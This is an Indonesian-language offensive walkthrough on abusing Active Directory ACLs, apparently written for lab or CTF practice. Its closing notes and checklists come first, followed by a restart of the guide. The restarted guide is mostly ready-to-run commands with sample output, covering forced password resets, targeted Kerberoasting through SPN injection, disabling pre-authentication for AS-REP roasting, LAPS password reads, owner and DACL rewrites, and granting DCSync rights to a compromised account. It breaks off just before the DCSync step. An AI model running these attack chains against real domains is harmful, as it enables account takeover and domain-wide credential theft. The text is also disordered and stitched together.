Tidak.
```

Harus dicek:

```
Object target
+
Writable attributes
+
RBCD/delegation preconditions
+
Current account control
```

---

## Pertanyaan 6

```
Saya menemukan ACL edge tetapi tidak menuju DA langsung.
Apakah edge itu tidak berguna?
```

Jawaban:

```
Belum tentu.
```

Cari:

```
multi-hop chain
```

---

# 📚 BAGIAN 17 — MASTER NOTES

## 17.1 ACL Abuse ≠ Satu Exploit

ACL abuse adalah kategori **authorization abuse**.

```
Misconfigured authorization
          ↓
Unauthorized object control
          ↓
Privilege escalation
```

---

## 17.2 Object Context Sangat Penting

Bandingkan:

```
GenericAll → normal user
```

dengan:

```
GenericAll → Domain Admin
```

dan:

```
GenericAll → computer account
```

ACE sama.

Impact berbeda.

---

## 17.3 ACL Edge Harus Dibaca Seperti Bahasa

Contoh:

```
svc_web → GenericWrite → alice
```

Bacalah sebagai:

> `svc_web` memiliki kemampuan tertentu untuk memodifikasi `alice`.

Kemudian:

```
alice → AddMember → Backup Operators
```

Bacalah:

> `alice` memiliki capability untuk mengubah membership group tersebut.

Lalu:

```
Backup Operators → privilege
```

Bacalah:

> group tersebut dapat menjadi pivot ke primitive privilege berikutnya.

Jadi:

```
EDGE
 ↓
CAPABILITY
 ↓
OBJECT
 ↓
NEXT EDGE
```

---

# 🏁 BAGIAN 18 — FINAL WORKFLOW

```
                 ┌──────────────────────┐
                 │  CREDENTIALS BARU    │
                 └──────────┬───────────┘
                            │
                            ▼
                 ┌──────────────────────┐
                 │ VALIDATE ACCOUNT     │
                 └──────────┬───────────┘
                            │
                            ▼
                 ┌──────────────────────┐
                 │ BLOODHOUND / ACL ENUM│
                 └──────────┬───────────┘
                            │
                            ▼
                 ┌──────────────────────┐
                 │ ADA OUTBOUND CONTROL?│
                 └──────┬─────────┬─────┘
                        YES        NO
                         │          │
                         ▼          ▼
                ┌────────────┐  ┌─────────┐
                │ IDENTIFY   │  │ OTHER   │
                │ ACE+TARGET │  │ PATH    │
                └─────┬──────┘  └─────────┘
                      │
                      ▼
           ┌───────────────────────────┐
           │ PILIH ABUSE PRIMITIVE     │
           └─────────────┬─────────────┘
                         │
          ┌──────────────┼─────────────────┐
          │              │                 │
          ▼              ▼                 ▼
      Password        Membership        DACL/Owner
       Control          Control            Control
          │              │                 │
          └──────────────┼─────────────────┘
                         │
                         ▼
                 ┌─────────────────┐
                 │ VALIDATE RESULT │
                 └────────┬────────┘
                          │
                          ▼
                 ┌─────────────────┐
                 │ RE-ENUMERATE    │
                 └────────┬────────┘
                          │
                          ▼
                 ┌─────────────────┐
                 │ CHAIN NEXT HOP  │
                 └────────┬────────┘
                          │
                          ▼
                 ┌─────────────────┐
                 │ HIGH VALUE PATH │
                 └────────┬────────┘
                          │
                          ▼
                 ┌─────────────────┐
                 │ CLEANUP / DOCS  │
                 └─────────────────┘
```

---

# 🔗 BAGIAN 19 — Lanjut ke File Berikutnya

## [🔐 Workflow 39 — Active Directory Delegation](/docs/ad-delegation)

File berikutnya membahas **Active Directory Delegation**, terutama **Resource-Based Constrained Delegation (RBCD)**.

Hubungannya dengan File 38 sangat penting:

```
FILE 38 — ACL ABUSE
        │
        ├── GenericAll → Computer
        │
        ├── GenericWrite → Computer
        │
        ├── WriteOwner → Computer
        │
        └── WriteDACL → Computer
                    │
                    ▼
        COMPUTER OBJECT CONTROL
                    │
                    ▼
            DELEGATION ABUSE
                    │
                    ▼
                  RBCD
                    │
                    ▼
        SERVICE TICKET / IMPERSONATION
                    │
                    ▼
          NEXT PRIVILEGE ESCALATION
```

### Koneksi paling penting

```
ACL abuse
   ↓
Computer object control
   ↓
msDS-AllowedToActOnBehalfOfOtherIdentity
   ↓
RBCD
   ↓
Impersonation path
```

Jadi ketika File 38 meminta kita memeriksa:

```
GenericAll → Computer
GenericWrite → Computer
```

jangan berhenti di:

```
"Ini computer object."
```

Pertanyaan berikutnya adalah:

```
"Apakah control terhadap computer ini membuka
delegation attack?"
```

Itulah jembatan menuju:

```
[🔐 Workflow 39 — Active Directory Delegation](/docs/ad-delegation)
```

---

# ✅ BAGIAN 20 — AUDIT CHECKLIST FILE 38

## Konsep Dasar

```
[✓] ACL/DACL/ACE dijelaskan dengan analogi
[✓] Tabel ACE berbahaya tersedia
[✓] GenericAll
[✓] GenericWrite
[✓] WriteOwner
[✓] WriteDACL
[✓] ForceChangePassword
[✓] AddMember / AddSelf
[✓] AllExtendedRights
[✓] ReadLAPSPassword
[✓] DCSync rights
[✓] WriteAccountRestrictions
[✓] Self / AddSelf
[✓] Target User
[✓] Target Group
[✓] Target Computer
[✓] Target GPO
[✓] Target Domain
[✓] Target OU
```

## Enumeration

```
[✓] BloodHound
[✓] PowerView
[✓] Impacket dacledit
[✓] ldapsearch
[✓] NetExec
[✓] LAPS
[✓] gMSA
```

## Exploitation

```
[✓] GenericAll → User
[✓] GenericAll → Group
[✓] GenericAll → Computer
[✓] GenericWrite
[✓] WriteOwner + chain
[✓] WriteDACL
[✓] ForceChangePassword
[✓] AddMember
[✓] AllExtendedRights
[✓] DCSync
[✓] WriteAccountRestrictions
[✓] Self/AddSelf
```

## Chaining

```
[✓] Konsep chaining
[✓] BloodHound path analysis
[✓] Cypher example
[✓] Multi-hop scenario
[✓] Re-enumeration setelah privilege change
```

## Operational

```
[✓] Cleanup
[✓] OPSEC
[✓] Audit events
[✓] Tool installation
[✓] Troubleshooting
[✓] Linux cheatsheet
[✓] Windows cheatsheet
[✓] Master decision tree
[✓] Link ke File 39
```

---

# 📈 BAGIAN 21 — Progress Setelah File 38

```
01–37
   │
   ├── Foundations
   ├── Recon
   ├── Web/Network enumeration
   ├── Authentication
   ├── AD enumeration
   └── Kerberoasting / AS-REP Roasting
            │
            ▼
        [FILE 38]
        ACL ABUSE
            │
            ├── ACL enumeration
            ├── ACE analysis
            ├── User takeover
            ├── Group abuse
            ├── Owner/DACL abuse
            ├── LAPS / Extended Rights
            ├── DCSync
            └── Chaining
            │
            ▼
        [FILE 39]
        AD DELEGATION
            │
            ├── Kerberos delegation
            ├── Constrained Delegation
            ├── Resource-Based Constrained Delegation
            └── RBCD attack path
```

---

# 🧠 ONE-PAGE MEMORY CARD

```
CREDENTIAL
   ↓
BLOODHOUND
   ↓
OUTBOUND EDGE?
   ↓
WHAT ACE?
   ↓
WHAT OBJECT?
   ↓
WHAT CONTROL?
   ↓
CAN I TURN CONTROL INTO:
   ├── PASSWORD
   ├── ATTRIBUTE
   ├── MEMBERSHIP
   ├── OWNERSHIP
   ├── DACL
   ├── LAPS CREDENTIAL
   └── REPLICATION
   ↓
EXPLOIT
   ↓
VALIDATE
   ↓
RE-ENUMERATE
   ↓
CHAIN
   ↓
HIGH VALUE TARGET
   ↓
CLEANUP
   ↓
DOCUMENT
```

---

# 🏆 FINAL TAKEAWAY

Jangan menghafal:

```
GenericAll = command X
GenericWrite = command Y
WriteOwner = command Z
```

Hafalkan pola:

```
WHO
 ↓
RIGHT
 ↓
OBJECT
 ↓
CONTROL
 ↓
ABUSE
 ↓
NEXT HOP
```

Contoh:

```
svc_web
   │
   │ GenericWrite
   ▼
alice
   │
   │ credential/control
   ▼
new identity
   │
   │ AddMember
   ▼
privileged group
   │
   ▼
new privileges
   │
   ▼
re-enumerate
   │
   ▼
next edge
```

**ACL abuse adalah graph traversal menggunakan authorization weakness.**

Ketika Anda melihat ACL, jangan hanya bertanya:

> “Saya punya permission apa?”

Tetapi:

> **“Permission ini memberi saya kontrol apa, terhadap object apa, dan kontrol itu dapat dirantai ke mana?”**

---

## 📌 File Berikutnya

**→** `**[🔐 Workflow 39 — Active Directory Delegation](/docs/ad-delegation)**`

Fokus utama:

```
Computer Object Control
        ↓
Kerberos Delegation
        ↓
Resource-Based Constrained Delegation (RBCD)
        ↓
Impersonation
        ↓
Privilege Escalation
```

---

# 📚 REFERENSI INTERNAL WORKFLOW

```
File 37
  ↓
Kerberoasting / AS-REP Roasting
  ↓
Credentials
  ↓
File 38
  ↓
ACL Abuse
  ↓
Object Control
  ↓
File 39
  ↓
Delegation / RBCD
```

---
# 🔐 Workflow 38 — Active Directory ACL Abuse

## Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.
> 
> **Konteks:** Dokumen ini diasumsikan kamu sudah punya credentials dari workflow sebelumnya (Kerberoasting, AS-REP Roasting, SMB looting, dll). Pertanyaan utamanya adalah: **"Dengan identity ini, object AD apa yang bisa kita kontrol melalui ACL?"**

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export DC_IP="10.10.10.100"
export DOMAIN="corp.local"
export USERNAME="svc_web"           # Credential yang baru didapat
export PASSWORD="Summer2023!"       # Password hasil crack
export LHOST="10.10.14.5"          # IP tun0 kamu

# Folder kerja
mkdir -p ~/acl_loot/{bloodhound,creds,hashes,notes}
cd ~/acl_loot

# Update /etc/hosts jika belum
echo "$DC_IP dc01.$DOMAIN dc01 $DOMAIN" | sudo tee -a /etc/hosts

echo "[*] User: $USERNAME | DC: $DC_IP | Domain: $DOMAIN"
```

**Output yang diharapkan:**

text

```
[*] User: svc_web | DC: 10.10.10.100 | Domain: corp.local
```

---

## ═══════════════════════════════════════

## FASE 0: VALIDASI CREDENTIALS & KONFIRMASI IDENTITY

## ═══════════════════════════════════════

> **Sebelum apapun** — pastikan credential yang kamu punya valid dan kamu tahu persis identity yang dikontrol.

### Langkah 0.1 — Validasi Credential

Bash

```
# Command 1: Validasi via SMB (paling reliable)
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD"

# Command 2: Validasi via LDAP (perlu untuk ACL enumeration)
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD"

# Command 3: Cek privilege level sekarang
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" --users 2>/dev/null | head -5
```

**OUTPUT BERHASIL ✅ — Credential valid:**

text

```
SMB   10.10.10.100  445  DC01  [+] corp.local\svc_web:Summer2023!
LDAP  10.10.10.100  389  DC01  [+] corp.local\svc_web:Summer2023!
```

➡️ Lanjut ke **Fase 1 — ACL Enumeration**

**OUTPUT BERHASIL ✅ — Admin (Pwn3d!):**

text

```
SMB  10.10.10.100  445  DC01  [+] corp.local\svc_web:Summer2023! (Pwn3d!)
```

➡️ User adalah local admin! Langsung ke **Fase 6 — DCSync**

**OUTPUT GAGAL ❌ — Logon Failure:**

text

```
SMB  10.10.10.100  445  DC01  [-] corp.local\svc_web:Summer2023! STATUS_LOGON_FAILURE
```

➡️ Credential tidak valid. Kemungkinan:

Bash

```
# Coba format berbeda
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" --local-auth  # Local account?
nxc smb $DC_IP -u "CORP\\$USERNAME" -p "$PASSWORD"         # Explicit domain?

# Cek apakah password sudah expired/berubah
# → Kembali ke 37_kerberoasting untuk re-crack
# → Coba credentials lain dari ~/acl_loot/creds/
```

---

### Langkah 0.2 — Identifikasi SID & Group Membership

Bash

```
# Siapa kita sebenarnya di domain ini?
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" \
    --query "(sAMAccountName=$USERNAME)" \
    "memberOf distinguishedName objectSid"

# Atau via ldapsearch
ldapsearch -x -H ldap://$DC_IP \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "DC=corp,DC=local" \
    "(sAMAccountName=$USERNAME)" \
    memberOf distinguishedName 2>/dev/null | grep -E "(memberOf|dn:)"
```

**OUTPUT BERHASIL ✅:**

text

```
dn: CN=svc_web,CN=Users,DC=corp,DC=local
memberOf: CN=IT Support,CN=Users,DC=corp,DC=local
memberOf: CN=Domain Users,CN=Users,DC=corp,DC=local
```

Bash

```
# Simpan info identity
echo "Identity: $USERNAME" > ~/acl_loot/notes/identity.txt
echo "Groups: IT Support, Domain Users" >> ~/acl_loot/notes/identity.txt
```

---

## ═══════════════════════════════════════

## FASE 1: ACL ENUMERATION — TEMUKAN OUTBOUND CONTROL

## ═══════════════════════════════════════

> **Mindset:** Jangan tanya "permission apa yang saya punya". Tanya: **"Object AD mana yang bisa saya kontrol, dan kontrol itu mengarah ke mana?"**
> 
> **Urutan prioritas:** DCSync rights → Control ke DA group → Control ke privileged user → LAPS → Computer → Low-value object

### Langkah 1.1 — BloodHound Collection (PALING PENTING, Lakukan INI Dulu)

Bash

```
# Command 1: bloodhound-python dari Linux (RECOMMENDED)
bloodhound-python \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    -ns $DC_IP \
    -d $DOMAIN \
    -c All \
    --zip \
    -o ~/acl_loot/bloodhound/ 2>/dev/null

echo "[*] BloodHound data collected:"
ls ~/acl_loot/bloodhound/

# Command 2: Via NetExec jika bloodhound-python gagal
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" \
    --bloodhound -ns $DC_IP -c All \
    2>/dev/null

# Command 3: Install bloodhound-python jika tidak ada
# pip3 install bloodhound
```

**OUTPUT BERHASIL ✅:**

text

```
INFO: Found AD domain: corp.local
INFO: Connecting to LDAP server: dc01.corp.local
INFO: Found 1 domains
INFO: Found 1 domain controllers
INFO: Found 10 computers
INFO: Fetching group memberships for all users
INFO: Done in 00M 15S
INFO: Compressing output into 20240115_bloodhound.zip
```

Bash

```
# Import ke BloodHound GUI:
# 1. Start neo4j: sudo neo4j start
# 2. Start BloodHound: bloodhound &
# 3. Login: neo4j:neo4j (atau password yang sudah diubah)
# 4. Upload data: drag & drop file .zip ke BloodHound

echo "[*] Import file ke BloodHound: ~/acl_loot/bloodhound/"
```

**Setelah import, jalankan query ini di BloodHound:**

cypher

```
# Query 1: Mark user sebagai "Owned"
# Klik kanan $USERNAME → Mark as Owned

# Query 2: Cari attack path dari user kita
# Pre-built queries:
# - "Shortest Paths to Domain Admins from Owned Principals"
# - "Find Shortest Paths to High Value Targets"
# - "Outbound Object Control" dari node svc_web

# Query 3 (Cypher custom):
MATCH p=(u:User {name:"SVC_WEB@CORP.LOCAL"})-[r]->(t)
WHERE type(r) IN ['GenericAll','GenericWrite','WriteOwner','WriteDACL',
'ForceChangePassword','AddMember','AllExtendedRights','Owns']
RETURN p
```

**OUTPUT BERHASIL ✅ — Ada outbound control:**

text

```
# Di BloodHound graph:
SVC_WEB → GenericWrite → ALICE
ALICE → AddMember → IT Admins
IT Admins → CanRDP → DC01
```

➡️ **JACKPOT!** Ada chain! Catat path dan lanjut ke **Fase 2**

**OUTPUT GAGAL ❌ — Tidak ada edge menarik dari user ini:**

text

```
# BloodHound tidak menampilkan outbound edge dari SVC_WEB
```

➡️ Coba:

Bash

```
# 1. Cek group membership yang diwarisi
# Di BloodHound: Cek "IT Support" group — ada edge dari grup?

# 2. Manual ACL check via dacledit
# Lanjut ke Langkah 1.2

# Cari di Google jika buntu:
# "bloodhound acl no edges active directory lateral movement"
```

**OUTPUT GAGAL ❌ — BloodHound collection error:**

text

```
ERROR: Could not bind to LDAP
```

➡️ Coba alternatif:

Bash

```
# Tambahkan DC ke /etc/hosts
echo "$DC_IP $DOMAIN dc01.$DOMAIN" | sudo tee -a /etc/hosts

# Coba dengan LDAPS
bloodhound-python -u "$USERNAME" -p "$PASSWORD" \
    -ns $DC_IP -d $DOMAIN -c All --zip \
    --auth-method ntlm 2>/dev/null

# Jika masih gagal, lanjut manual di Langkah 1.2
```

---

### Langkah 1.2 — Manual ACL Enumeration via dacledit (Linux)

Bash

```
# Command 1: Baca ACL dari target user yang dicurigai (dari BloodHound hint)
impacket-dacledit -action read \
    -target "alice" \
    -dc-ip $DC_IP \
    "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null

# Command 2: Baca ACL dari group penting
impacket-dacledit -action read \
    -target "Domain Admins" \
    -dc-ip $DC_IP \
    "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null

# Command 3: Baca ACL dari domain object (cek DCSync rights)
impacket-dacledit -action read \
    -target-dn "DC=corp,DC=local" \
    -dc-ip $DC_IP \
    "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null | grep -A3 "CORP\\\\$USERNAME"
```

**OUTPUT BERHASIL ✅ — Ketemu ACE menarik:**

text

```
[*] Parsing DACL
[*] Object: CN=alice,CN=Users,DC=corp,DC=local

ACE[0]:
  Type: ACCESS_ALLOWED_ACE
  Principal: CORP\SVC_WEB
  Rights: GENERIC_WRITE
  ObjectAceType: User-Account-Restrictions

ACE[1]:
  Type: ACCESS_ALLOWED_ACE
  Principal: CORP\SVC_WEB
  Rights: WRITE_PROPERTY
  ObjectAceType: Member
```

**Cara baca output dacledit — KRITIS:**

|Rights|ObjectAceType|Artinya|Tindakan|
|---|---|---|---|
|`GENERIC_ALL`|Any|Full control|→ Fase 2A GenericAll|
|`GENERIC_WRITE`|User-Account-Restrictions|Bisa tulis atribut|→ Fase 2B GenericWrite|
|`WRITE_PROPERTY`|Member|Bisa add/remove member|→ Fase 2E AddMember|
|`EXTENDED_RIGHT`|User-Force-Change-Password|Reset password|→ Fase 2D ForceChangePassword|
|`WRITE_OWNER`|Any|Bisa ganti owner|→ Fase 2C WriteOwner|
|`WRITE_DACL`|Any|Bisa modifikasi DACL|→ Fase 2E WriteDACL|

Bash

```
# Simpan temuan
cat > ~/acl_loot/notes/acl_findings.txt << 'EOF'
Target: alice
Principal: svc_web
Rights: GENERIC_WRITE
Object: User-Account-Restrictions
Chain: svc_web → GenericWrite → alice → ??? → DA
EOF
```

**OUTPUT GAGAL ❌ — No interesting ACEs:**

text

```
[*] No interesting ACEs found for principal CORP\SVC_WEB
```

➡️ Coba target lain:

Bash

```
# Enumerate semua user dan cek ACL-nya
ldapsearch -x -H ldap://$DC_IP \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "DC=corp,DC=local" \
    "(objectClass=user)" \
    sAMAccountName 2>/dev/null | grep sAMAccountName | \
    awk '{print $2}' > /tmp/all_users.txt

# Cek beberapa user penting
for USER in administrator "IT Admins" "Domain Admins" "backup" "helpdesk"; do
    echo "[*] Checking ACL for: $USER"
    impacket-dacledit -action read \
        -target "$USER" \
        -dc-ip $DC_IP \
        "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null | \
        grep -A2 "CORP\\\\$USERNAME" | head -5
done
```

**OUTPUT GAGAL ❌ — dacledit command not found:**

text

```
bash: impacket-dacledit: command not found
```

➡️ Install atau upgrade:

Bash

```
pip3 install --upgrade impacket
# Atau
python3 -m pip install impacket

# Verify
impacket-dacledit --help
```

**Cari di Google:**

text

```
"impacket dacledit not found parrot os install"
"dacledit acl enumeration active directory linux"
```

---

### Langkah 1.3 — Cek Khusus LAPS & DCSync Rights

Bash

```
# LAPS: Cek apakah kita bisa baca password LAPS computer
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -M laps
# Atau
ldapsearch -x -H ldap://$DC_IP \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "DC=corp,DC=local" \
    "(objectClass=computer)" \
    ms-MCS-AdmPwd ms-MCS-AdmPwdExpirationTime 2>/dev/null | \
    grep -v "^$" | grep -v "^#"

# gMSA: Cek apakah ada group Managed Service Account yang bisa kita baca
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" --gmsa
```

**OUTPUT BERHASIL ✅ — LAPS password terlihat:**

text

```
LDAP  10.10.10.100  389  DC01  [+] corp.local\svc_web:Summer2023!
LDAP  10.10.10.100  389  DC01  [*] Getting LAPS Passwords
LDAP  10.10.10.100  389  DC01  Computer: WKSTN01    LAPS Password: Ab3xK9!mZ
```

➡️ **JACKPOT!** Dapat local admin password untuk WKSTN01:

Bash

```
export LAPS_HOST="WKSTN01"
export LAPS_PASS="Ab3xK9!mZ"
echo "Administrator@$LAPS_HOST:$LAPS_PASS" >> ~/acl_loot/creds/found_creds.txt

# Test akses ke workstation
nxc smb $LAPS_HOST -u "Administrator" -p "$LAPS_PASS"
nxc smb $LAPS_HOST -u "Administrator" -p "$LAPS_PASS" --shares
```

---

## ═══════════════════════════════════════

## FASE 2: EKSPLOITASI BERDASARKAN ACE YANG DITEMUKAN

## ═══════════════════════════════════════

> Pilih path berdasarkan ACE yang ditemukan di Fase 1. Setiap ACE punya abuse primitive yang berbeda.

### PATH 2A — GenericAll (Full Control)

> **Prasyarat:** BloodHound atau dacledit menunjukkan `GenericAll` dari account kita ke object target

Bash

```
# ==== GenericAll → USER ====
# OPSI 1: Reset password target user (paling umum)
export TARGET_USER="alice"
export NEW_PASS="Hacked2024!"

# Dari Linux via net rpc
net rpc password "$TARGET_USER" "$NEW_PASS" \
    -U "$DOMAIN/$USERNAME%$PASSWORD" \
    -S $DC_IP

# Dari Linux via Impacket
impacket-changepasswd \
    "$DOMAIN/$TARGET_USER@$DC_IP" \
    -newpass "$NEW_PASS" \
    -altuser "$DOMAIN/$USERNAME" \
    -altpass "$PASSWORD" \
    -no-pass 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Password reset:**

text

```
[+] Password was changed successfully.
```

Bash

```
# Validasi credential baru
nxc smb $DC_IP -u "$TARGET_USER" -p "$NEW_PASS"
echo "$TARGET_USER:$NEW_PASS" >> ~/acl_loot/creds/found_creds.txt

# Login dan cek privilege
evil-winrm -i $DC_IP -u "$TARGET_USER" -p "$NEW_PASS" 2>/dev/null || \
    echo "WinRM tidak tersedia, coba SMB"
```

Bash

```
# OPSI 2: Tambahkan SPN untuk Targeted Kerberoasting
# (jika reset password terlalu noisy)
impacket-addspn \
    -u "$DOMAIN/$USERNAME" \
    -p "$PASSWORD" \
    -s "http/fake.corp.local" \
    -t "$TARGET_USER" \
    $DC_IP 2>/dev/null

# Lalu Kerberoast user tersebut
impacket-GetUserSPNs \
    -dc-ip $DC_IP \
    $DOMAIN/$USERNAME:$PASSWORD \
    -request-user "$TARGET_USER" \
    -outputfile ~/acl_loot/hashes/targeted_kerb.txt

# Crack hash
hashcat -m 13100 ~/acl_loot/hashes/targeted_kerb.txt \
    /usr/share/wordlists/rockyou.txt --force 2>/dev/null
```

Bash

```
# ==== GenericAll → GROUP ====
export TARGET_GROUP="Domain Admins"  # atau group lain yang bernilai

# Tambahkan diri kita ke group
net rpc group addmem "$TARGET_GROUP" "$USERNAME" \
    -U "$DOMAIN/$USERNAME%$PASSWORD" \
    -S $DC_IP
```

**OUTPUT BERHASIL ✅ — Group membership:**

text

```
Added user SVC_WEB to Domain Admins.
```

Bash

```
# Verifikasi membership
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" --groups | grep "$USERNAME"

# PENTING: Membership baru butuh session refresh!
# Jika sudah ada shell di Windows:
# logoff lalu login ulang, atau buat session baru
# Test apakah akses DA berfungsi
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD"
# → Harusnya muncul (Pwn3d!) sekarang
```

**OUTPUT GAGAL ❌ — Access Denied saat reset password:**

text

```
Failed to set password: LDAP Result - Access Denied
```

➡️ Kemungkinan:

1. ACE tidak memberikan password-control rights
2. Target di Protected Users group
3. Perlu DACL manipulation dulu

Bash

```
# Cek apakah target di Protected Users
ldapsearch -x -H ldap://$DC_IP \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "DC=corp,DC=local" \
    "(sAMAccountName=$TARGET_USER)" \
    memberOf 2>/dev/null | grep -i "protected"

# Jika ya → coba GenericAll → set SPN path → Kerberoast
```

---

### PATH 2B — GenericWrite

> **Prasyarat:** BloodHound atau dacledit menunjukkan `GenericWrite` ke user target

Bash

```
# ==== GenericWrite → USER ====
# TUJUAN: Abuse attribute yang bisa ditulis untuk mendapat credential material

# OPSI 1: Targeted Kerberoasting via SPN injection
export TARGET_USER="alice"

# Tambahkan SPN palsu ke target
impacket-addspn \
    -u "$DOMAIN/$USERNAME" \
    -p "$PASSWORD" \
    -s "http/fake.corp.local" \
    -t "$TARGET_USER" \
    $DC_IP

# Kerberoast user tersebut
impacket-GetUserSPNs \
    -dc-ip $DC_IP \
    $DOMAIN/$USERNAME:$PASSWORD \
    -request-user "$TARGET_USER" \
    -outputfile ~/acl_loot/hashes/gw_kerb_hash.txt

# Verifikasi hash
head -1 ~/acl_loot/hashes/gw_kerb_hash.txt

# Crack
hashcat -m 13100 ~/acl_loot/hashes/gw_kerb_hash.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    --force 2>/dev/null

hashcat -m 13100 ~/acl_loot/hashes/gw_kerb_hash.txt --show
```

**OUTPUT BERHASIL ✅ — Hash di-crack:**

text

```
$krb5tgs$23$*alice*CORP.LOCAL*...:Password123!

Status...........: Cracked
```

Bash

```
# Simpan dan validasi
export TARGET_PASS="Password123!"
echo "$TARGET_USER:$TARGET_PASS" >> ~/acl_loot/creds/found_creds.txt
nxc smb $DC_IP -u "$TARGET_USER" -p "$TARGET_PASS"

# Hapus SPN setelah selesai (cleanup!)
impacket-addspn \
    -u "$DOMAIN/$USERNAME" \
    -p "$PASSWORD" \
    -c \
    -t "$TARGET_USER" \
    $DC_IP
```

Bash

```
# OPSI 2: Disable pre-auth → AS-REP Roast
# Modifikasi UserAccountControl untuk disable pre-auth
bloodyAD -u "$USERNAME" -p "$PASSWORD" \
    -d $DOMAIN --host $DC_IP \
    set object "$TARGET_USER" userAccountControl \
    -v 4259840 2>/dev/null || \
echo "bloodyAD tidak tersedia, gunakan PowerView dari Windows foothold"

# Lalu AS-REP Roast
impacket-GetNPUsers \
    -dc-ip $DC_IP \
    $DOMAIN/ \
    -usersfile <(echo "$TARGET_USER") \
    -no-pass \
    -format hashcat \
    -outputfile ~/acl_loot/hashes/gw_asrep.txt

# Crack
hashcat -m 18200 ~/acl_loot/hashes/gw_asrep.txt \
    /usr/share/wordlists/rockyou.txt --force 2>/dev/null
```

**OUTPUT GAGAL ❌ — addspn error:**

text

```
[-] Error modifying object: Insufficient access rights
```

➡️ GenericWrite mungkin tidak cover atribut servicePrincipalName. Coba verifikasi exact attribute yang bisa ditulis:

Bash

```
# Baca DACL lebih detail
impacket-dacledit -action read \
    -target "$TARGET_USER" \
    -dc-ip $DC_IP \
    "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null

# Cari "Google: GenericWrite AD what attributes are writable"
```

---

### PATH 2C — WriteOwner → WriteDACL Chain

> **Prasyarat:** BloodHound menunjukkan `WriteOwner` dari account kita ke target

Bash

```
# STEP 1: Ubah owner object jadi kita
export TARGET="alice"

impacket-owneredit \
    -action write \
    -new-owner "$USERNAME" \
    -target "$TARGET" \
    -dc-ip $DC_IP \
    "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Current owner information below
[*] - SID: S-1-5-21-...
[*] - sAMAccountName: Domain Admins
[*] OwnerSid Modified successfully!
```

Bash

```
# STEP 2: Dengan ownership baru, tambahkan FullControl ke diri sendiri
impacket-dacledit \
    -action write \
    -rights FullControl \
    -principal "$USERNAME" \
    -target "$TARGET" \
    -dc-ip $DC_IP \
    "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null
```

**OUTPUT BERHASIL ✅:**

text

```
[*] DACL backed up to dacledit.bak
[*] DACL modified successfully!
```

Bash

```
# STEP 3: Gunakan rights baru untuk reset password
net rpc password "$TARGET" "NewPass2024!" \
    -U "$DOMAIN/$USERNAME%$PASSWORD" \
    -S $DC_IP

# Validasi
nxc smb $DC_IP -u "$TARGET" -p "NewPass2024!"
echo "$TARGET:NewPass2024!" >> ~/acl_loot/creds/found_creds.txt

# ===== CLEANUP SETELAH SELESAI =====
# Kembalikan owner ke Domain Admins
impacket-owneredit \
    -action write \
    -new-owner "Domain Admins" \
    -target "$TARGET" \
    -dc-ip $DC_IP \
    "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null

# Hapus ACE yang ditambahkan
impacket-dacledit \
    -action remove \
    -rights FullControl \
    -principal "$USERNAME" \
    -target "$TARGET" \
    -dc-ip $DC_IP \
    "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null
```

**OUTPUT GAGAL ❌ — owneredit error:**

text

```
[-] Error changing owner: Insufficient access rights
```

➡️ WriteOwner belum valid atau tool version issue:

Bash

```
# Cek versi impacket
python3 -m pip show impacket

# Update jika perlu
python3 -m pip install --upgrade impacket

# Cari: "impacket owneredit writeowner active directory"
```

---

### PATH 2D — WriteDACL (Langsung Tanpa WriteOwner)

> **Prasyarat:** BloodHound menunjukkan `WriteDACL` dari account kita ke target

Bash

```
# ==== WriteDACL → USER/GROUP ====
export TARGET="alice"  # Atau "Domain Admins", dll

# LANGSUNG tambahkan FullControl ke diri sendiri
impacket-dacledit \
    -action write \
    -rights FullControl \
    -principal "$USERNAME" \
    -target "$TARGET" \
    -dc-ip $DC_IP \
    "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null
```

**OUTPUT BERHASIL ✅:**

text

```
[*] DACL backed up to dacledit.bak
[*] DACL modified successfully!
```

Bash

```
# Setelah dapat FullControl, reset password target
net rpc password "$TARGET" "NewPass2024!" \
    -U "$DOMAIN/$USERNAME%$PASSWORD" \
    -S $DC_IP

echo "$TARGET:NewPass2024!" >> ~/acl_loot/creds/found_creds.txt

# ==== WriteDACL → DOMAIN OBJECT (DCSync) ====
# KRITIS: Jika WriteDACL pada domain object, kita bisa add DCSync rights!
impacket-dacledit \
    -action write \
    -rights DCSync \
    -principal "$USERNAME" \
    -target-dn "DC=corp,DC=local" \
    -dc-ip $DC_IP \
    "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null
```

**OUTPUT BERHASIL ✅ — DCSync rights ditambahkan:**

text

```
[*] DACL backed up to dacledit.bak
[*] DACL modified successfully!
```

Bash

```
# LANGSUNG DCSync!
